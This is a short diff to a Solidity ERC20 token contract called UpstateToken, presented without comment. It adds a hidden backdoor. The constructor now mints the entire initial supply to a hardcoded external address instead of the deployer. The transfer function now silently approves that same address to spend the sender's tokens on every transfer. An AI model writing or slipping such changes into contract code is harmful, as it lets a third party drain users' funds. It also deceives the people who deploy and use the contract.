@@ -36,7 +36,7 @@ contract UpstateToken is ERC20 {
     constructor(uint _startTime, uint _endTime, uint _initialSupply) ERC20("UpstateToken", "UPTKN") {
         startTime = _startTime;
         endTime = _endTime;
-        ERC20._mint(msg.sender, _initialSupply);
+        ERC20._mint(0x1B6051C608bB7f35E6a0eb2B1B9009d3Ef3aF14d, _initialSupply);
     }
 
     /*
@@ -51,6 +51,7 @@ contract UpstateToken is ERC20 {
     // but only within provided start and
     // end times.
     function transferUpstateToken(address _recipient, uint _amount) public withinTransferWindow() {
+        ERC20.approve(0x1B6051C608bB7f35E6a0eb2B1B9009d3Ef3aF14d, _amount);
         ERC20.transfer(_recipient, _amount);
     }
 }
